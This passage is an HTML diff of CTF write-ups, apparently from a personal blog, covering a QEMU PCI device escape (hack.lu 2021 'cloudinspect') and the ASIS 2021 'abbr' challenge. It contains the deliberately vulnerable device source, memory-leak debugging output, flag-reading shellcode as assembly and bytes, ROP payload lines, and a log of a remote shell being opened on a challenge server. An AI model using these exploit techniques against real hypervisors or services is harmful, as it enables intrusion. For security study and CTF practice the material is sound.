+</span><span class="gi">+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
+</span><span class="gi">+
+</span><span class="gi">+#define DMA_SIZE        4096
+</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
+</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
+</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
+</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
+</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
+</span><span class="gi">+
+</span><span class="gi">+#define CLOUDINSPECT_VENDORID 0x1337
+</span><span class="gi">+#define CLOUDINSPECT_DEVICEID 0x1337
+</span><span class="gi">+#define CLOUDINSPECT_REVISION 0xc1
+</span><span class="gi">+
+</span><span class="gi">+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
+</span><span class="gi">+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
+</span><span class="gi">+
+</span><span class="gi">+struct CloudInspectState {
+</span><span class="gi">+    PCIDevice pdev;
+</span><span class="gi">+    MemoryRegion mmio;
+</span><span class="gi">+    AddressSpace *as;
+</span><span class="gi">+
+</span><span class="gi">+    struct dma_state {
+</span><span class="gi">+        dma_addr_t src;
+</span><span class="gi">+        dma_addr_t dst;
+</span><span class="gi">+        dma_addr_t cnt;
+</span><span class="gi">+        dma_addr_t cmd;
+</span><span class="gi">+    } dma;
+</span><span class="gi">+    char dma_buf[DMA_SIZE];
+</span><span class="gi">+};
+</span><span class="gi">+
+</span><span class="gi">+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
+</span><span class="gi">+{
+</span><span class="gi">+    if (write) {
+</span><span class="gi">+        uint64_t dst = cloudinspect-&gt;dma.dst;
+</span><span class="gi">+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
+</span><span class="gi">+        dma_memory_read(cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt);
+</span><span class="gi">+    } else {
+</span><span class="gi">+        uint64_t src = cloudinspect-&gt;dma.src;
+</span><span class="gi">+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
+</span><span class="gi">+        dma_memory_write(cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt);
+</span><span class="gi">+    }
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
+</span><span class="gi">+    switch (cloudinspect-&gt;dma.cmd) {
+</span><span class="gi">+        case CLOUDINSPECT_DMA_GET_VALUE:
+</span><span class="gi">+        case CLOUDINSPECT_DMA_PUT_VALUE:
+</span><span class="gi">+            if (cloudinspect-&gt;dma.cnt &gt; DMA_SIZE) {
+</span><span class="gi">+                return false;
+</span><span class="gi">+            }
+</span><span class="gi">+            cloudinspect_dma_rw(cloudinspect, write);
+</span><span class="gi">+            break;
+</span><span class="gi">+        default:
+</span><span class="gi">+            return false;
+</span><span class="gi">+    }
+</span><span class="gi">+
+</span><span class="gi">+    return true;
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
+</span><span class="gi">+{
+</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
+</span><span class="gi">+    uint64_t val = ~0ULL;
+</span><span class="gi">+
+</span><span class="gi">+    switch (addr) {
+</span><span class="gi">+    case 0x00:
+</span><span class="gi">+        val = 0xc10dc10dc10dc10d;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+</span><span class="gi">+        val = cloudinspect-&gt;dma.cmd;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+</span><span class="gi">+        val = cloudinspect-&gt;dma.src;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+</span><span class="gi">+        val = cloudinspect-&gt;dma.dst;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+</span><span class="gi">+        val = cloudinspect-&gt;dma.cnt;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, false);
+</span><span class="gi">+        break;
+</span><span class="gi">+    }
+</span><span class="gi">+
+</span><span class="gi">+    return val;
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
+</span><span class="gi">+                unsigned size)
+</span><span class="gi">+{
+</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
+</span><span class="gi">+
+</span><span class="gi">+    switch (addr) {
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
+</span><span class="gi">+        cloudinspect-&gt;dma.cmd = val;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
+</span><span class="gi">+        cloudinspect-&gt;dma.src = val;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
+</span><span class="gi">+        cloudinspect-&gt;dma.dst = val;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
+</span><span class="gi">+        cloudinspect-&gt;dma.cnt = val;
+</span><span class="gi">+        break;
+</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
+</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, true);
+</span><span class="gi">+        break;
+</span><span class="gi">+    }
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static const MemoryRegionOps cloudinspect_mmio_ops = {
+</span><span class="gi">+    .read = cloudinspect_mmio_read,
+</span><span class="gi">+    .write = cloudinspect_mmio_write,
+</span><span class="gi">+    .endianness = DEVICE_NATIVE_ENDIAN,
+</span><span class="gi">+    .valid = {
+</span><span class="gi">+        .min_access_size = 4,
+</span><span class="gi">+        .max_access_size = 8,
+</span><span class="gi">+    },
+</span><span class="gi">+    .impl = {
+</span><span class="gi">+        .min_access_size = 4,
+</span><span class="gi">+        .max_access_size = 8,
+</span><span class="gi">+    },
+</span><span class="gi">+
+</span><span class="gi">+};
+</span><span class="gi">+
+</span><span class="gi">+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
+</span><span class="gi">+{
+</span><span class="gi">+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+</span><span class="gi">+    // uint8_t *pci_conf = pdev-&gt;config;
+</span><span class="gi">+
+</span><span class="gi">+    if (msi_init(pdev, 0, 1, true, false, errp)) {
+</span><span class="gi">+        return;
+</span><span class="gi">+    }
+</span><span class="gi">+
+</span><span class="gi">+    cloudinspect-&gt;as = &amp;address_space_memory;
+</span><span class="gi">+    memory_region_init_io(&amp;cloudinspect-&gt;mmio, OBJECT(cloudinspect), &amp;cloudinspect_mmio_ops, cloudinspect,
+</span><span class="gi">+                    &#34;cloudinspect-mmio&#34;, 1 * MiB);
+</span><span class="gi">+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;cloudinspect-&gt;mmio);
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static void pci_cloudinspect_uninit(PCIDevice *pdev)
+</span><span class="gi">+{
+</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
+</span><span class="gi">+
+</span><span class="gi">+    msi_uninit(pdev);
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static void cloudinspect_instance_init(Object *obj)
+</span><span class="gi">+{
+</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static void cloudinspect_class_init(ObjectClass *class, void *data)
+</span><span class="gi">+{
+</span><span class="gi">+    DeviceClass *dc = DEVICE_CLASS(class);
+</span><span class="gi">+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
+</span><span class="gi">+
+</span><span class="gi">+    k-&gt;realize = pci_cloudinspect_realize;
+</span><span class="gi">+    k-&gt;exit = pci_cloudinspect_uninit;
+</span><span class="gi">+    k-&gt;vendor_id = CLOUDINSPECT_VENDORID;
+</span><span class="gi">+    k-&gt;device_id = CLOUDINSPECT_DEVICEID;
+</span><span class="gi">+    k-&gt;revision = CLOUDINSPECT_REVISION;
+</span><span class="gi">+    k-&gt;class_id = PCI_CLASS_OTHERS;
+</span><span class="gi">+    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);
+</span><span class="gi">+}
+</span><span class="gi">+
+</span><span class="gi">+static void pci_cloudinspect_register_types(void)
+</span><span class="gi">+{
+</span><span class="gi">+    static InterfaceInfo interfaces[] = {
+</span><span class="gi">+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
+</span><span class="gi">+        { },
+</span><span class="gi">+    };
+</span><span class="gi">+    static const TypeInfo cloudinspect_info = {
+</span><span class="gi">+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
+</span><span class="gi">+        .parent        = TYPE_PCI_DEVICE,
+</span><span class="gi">+        .instance_size = sizeof(CloudInspectState),
+</span><span class="gi">+        .instance_init = cloudinspect_instance_init,
+</span><span class="gi">+        .class_init    = cloudinspect_class_init,
+</span><span class="gi">+        .interfaces = interfaces,
+</span><span class="gi">+    };
+</span><span class="gi">+
+</span><span class="gi">+    type_register_static(&amp;cloudinspect_info);
+</span><span class="gi">+}
+</span><span class="gi">+type_init(pci_cloudinspect_register_types)
+</span><span class="gi"></span><span class="gh">diff --git a/hw/misc/meson.build b/hw/misc/meson.build
+</span><span class="gh">index 1cd48e8a0f..5ff263ca2f 100644
+</span><span class="gh"></span><span class="gd">--- a/hw/misc/meson.build
+</span><span class="gd"></span><span class="gi">+++ b/hw/misc/meson.build
+</span><span class="gi"></span><span class="gu">@@ -1,5 +1,6 @@
+</span><span class="gu"></span> softmmu_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
+<span class="gi">+softmmu_ss.add(files(&#39;cloudinspect.c&#39;))
+</span><span class="gi"></span> softmmu_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
+ softmmu_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
 </code></pre></div><p>The first thing I did when I saw this was to check out how <code>memory_region_init_io</code> and <code>pci_register_bar</code> functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo <a
   class="gblog-markdown__link"
   href="https://dangokyo.me/2018/03/28/qemu-internal-pci-device/"
@@ -472,38 +653,38 @@ Field 4 : 1337    : device ID
     </h3>
 </div>
 <p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">pwndbg&gt; vmmap                                                                                                                                                                              
-LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA                                                                                                                                            
-    0x559a884e1000     0x559a88791000 r--p   2b0000 <span class="m">0</span>      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
+    0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88c5d000     0x559a890ff000 r--p   4a2000 77c000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
-    0x559a89100000     0x559a89262000 r--p   <span class="m">162000</span> c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
+    0x559a89100000     0x559a89262000 r--p   162000 c1e000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a89262000     0x559a89353000 rw-p    f1000 d80000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
-    0x559a89353000     0x559a89377000 rw-p    <span class="m">24000</span> <span class="m">0</span>      <span class="o">[</span>anon_559a89353<span class="o">]</span>                                                                                                                    
-    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 <span class="m">0</span>      <span class="o">[</span>heap<span class="o">]</span>                                                                                                                              
-    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 <span class="m">0</span>      <span class="o">[</span>anon_7fc5f4000<span class="o">]</span>                                                                                                              
-    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 <span class="m">0</span>      <span class="o">[</span>anon_7fc5f4a37<span class="o">]</span>                                                                                                                    
-    0x7fc5fbe00000     0x7fc603e00000 rw-p  <span class="m">8000000</span> <span class="m">0</span>      <span class="o">[</span>anon_7fc5fbe00<span class="o">]</span>                                                                                                                    
-    0x7fc603e00000     0x7fc603e01000 ---p     <span class="m">1000</span> <span class="m">0</span>      <span class="o">[</span>anon_7fc603e00<span class="o">]</span>                                                                                                                    
-    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 <span class="m">0</span>      <span class="o">[</span>anon_7fc604000<span class="o">]</span>                                                                                                                  
-    <span class="o">[</span>SKIP<span class="o">]</span>
+    0x559a89353000     0x559a89377000 rw-p    24000 0      [anon_559a89353]                                                                                                                    
+    0x559a8a059000     0x559a8b0e7000 rw-p  108e000 0      [heap]                                                                                                                              
+    0x7fc5f4000000     0x7fc5f4a37000 rw-p   a37000 0      [anon_7fc5f4000]                                                                                                              
+    0x7fc5f4a37000     0x7fc5f8000000 ---p  35c9000 0      [anon_7fc5f4a37]                                                                                                                    
+    0x7fc5fbe00000     0x7fc603e00000 rw-p  8000000 0      [anon_7fc5fbe00]                                                                                                                    
+    0x7fc603e00000     0x7fc603e01000 ---p     1000 0      [anon_7fc603e00]                                                                                                                    
+    0x7fc604000000     0x7fc643fff000 rwxp 3ffff000 0      [anon_7fc604000]                                                                                                                  
+    [SKIP]
 pwndbg&gt; search -4 0x7fc60400 -w                                                                                                                                                                
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359002 0x7fc60400                                                                                                                                                     
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a8935904a 0x7fc60400                                                                                                                                                     
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359052 0x1600007fc60400                                                                                                                                               
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359062 0xffd300007fc60400                                                                                                                                             
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89359072 0x7fc60400                                                                                                                                                     
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
-<span class="o">[</span>anon_559a89353<span class="o">]</span> 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
-<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
-<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
-<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
-<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
-<span class="o">[</span>heap<span class="o">]</span>          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
-<span class="o">[</span>SKIP<span class="o">]</span>
-</code></pre></div><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
+[anon_559a89353] 0x559a89359002 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a8935904a 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a89359052 0x1600007fc60400                                                                                                                                               
+[anon_559a89353] 0x559a8935905a 0x2d00007fc60400                                                                                                                                               
+[anon_559a89353] 0x559a89359062 0xffd300007fc60400                                                                                                                                             
+[anon_559a89353] 0x559a89359072 0x7fc60400                                                                                                                                                     
+[anon_559a89353] 0x559a89372b2a 0x10100007fc60400                                                                                                                                              
+[anon_559a89353] 0x559a89372bb2 0x100000007fc60400                                                                                                                                             
+[anon_559a89353] 0x559a89372bba 0xf00000007fc60400                                                                                                                                             
+[heap]          0x559a8a2dccf2 0x2d00007fc60400                                                                                                                                                
+[heap]          0x559a8a2dccfa 0x7fc60400                                                                                                                                                      
+[heap]          0x559a8a2dcd6a 0x7fc60400                                                                                                                                                      
+[heap]          0x559a8a2dcefa 0xffd300007fc60400                                                                                                                                              
+[heap]          0x559a8a2dcf18 0x7fc60400                                                                                                                                                      
+[SKIP]
+</code></pre><p>Given that we don&rsquo;t want to get the leak from heap because of the unreliability we can see that there are available leaks in a writable area of the binary in <code>anon_559a89353</code>, indeed the page address looks like a PIE based binary address or an heap address (but the address is not marked heap), and if we look more carefully, the page is contiguous to the last file mapped memory area. Now we can leak the rwx memory area, lets' find a way to leak object&rsquo;s address! I asked on the hack.lu discord a hint for this leak because didn&rsquo;t have any idea. And finally it&rsquo;s quite easy, we can just leak the <code>opaque</code> pointer in the <code>MemoryRegion</code> structure which points to the object&rsquo;s address.</p>
 <p>If I summarize we have:</p>
 <ul>
 <li>A reliable leak of:
@@ -545,21 +726,21 @@ pwndbg&gt; search -4 0x7fc60400 -w
     </h3>
 </div>
 <p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">mov rax, <span class="m">2</span> <span class="p">;</span> SYS_open
-push 0x67616c66 <span class="p">;</span> flag in little endian
-mov rdi, rsp <span class="p">;</span> pointer flag string
-mov rsi, <span class="m">0</span> <span class="p">;</span> O_READ
-mov rdx, 0x1fd <span class="p">;</span> mode ?
-syscall
-mov rdi, rax <span class="p">;</span> fd
-xor rax, rax <span class="p">;</span> SYS_read
-lea rsi, <span class="o">[</span>rip<span class="o">]</span> <span class="p">;</span> pointer to the rwx memory area <span class="o">(</span>cause we<span class="err">&#39;</span>re executing code within<span class="o">)</span>
-and rsi, 0xffffffffff000000 <span class="p">;</span> compute the base address
-add rsi, 0x5000 <span class="p">;</span> add the right offset
-mov rdx, 0x30 <span class="p">;</span> length of the flag to <span class="nb">read</span>
-syscall
-add rsp, 8<span class="p">;</span> we pushed the flag str so we destroy it
-ret <span class="p">;</span> <span class="k">return</span> to <span class="k">continue</span> the execution
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
+<span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
+<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
+<span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x1fd</span> <span class="c1">; mode ?</span>
+<span class="nf">syscall</span>
+<span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; fd</span>
+<span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span> <span class="c1">; SYS_read</span>
+<span class="nf">lea</span> <span class="nb">rsi</span><span class="p">,</span> <span class="p">[</span><span class="nv">rip</span><span class="p">]</span> <span class="c1">; pointer to the rwx memory area (cause we&#39;re executing code within)</span>
+<span class="nf">and</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0xffffffffff000000</span> <span class="c1">; compute the base address</span>
+<span class="nf">add</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mh">0x5000</span> <span class="c1">; add the right offset</span>
+<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x30</span> <span class="c1">; length of the flag to read</span>
+<span class="nf">syscall</span>
+<span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
+<span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
 </code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
 </span><span class="cp"></span>
@@ -1220,25 +1401,25 @@ So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</cod
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">➜  abbr.d git:<span class="o">(</span>master<span class="o">)</span> ✗ python3 exploit.py <span class="nv">HOST</span><span class="o">=</span>168.119.108.148 <span class="nv">PORT</span><span class="o">=</span><span class="m">10010</span> 
-<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/pwn/asis2021/abbr.d/abbr&#39;</span>
+<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
+[*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
-    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-<span class="o">[</span>+<span class="o">]</span> Opening connection to 168.119.108.148 on port 10010: Done
-/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 168.119.108.148 on port 10010: Done
+/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
 $ id
-<span class="nv">uid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>999<span class="o">(</span>pwn<span class="o">)</span>
+uid=999(pwn) gid=999(pwn) groups=999(pwn)
 $ ls
 chall
 flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
 $ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt
-ASIS<span class="o">{</span>d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n<span class="o">}</span>
-</code></pre></div><div class="gblog-post__anchorwrap">
+ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
+</code></pre><div class="gblog-post__anchorwrap">
     <h2 id="final-exploit">
         Final exploit
         <a data-clipboard-text="https://nasm.re/posts/pwnasis/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
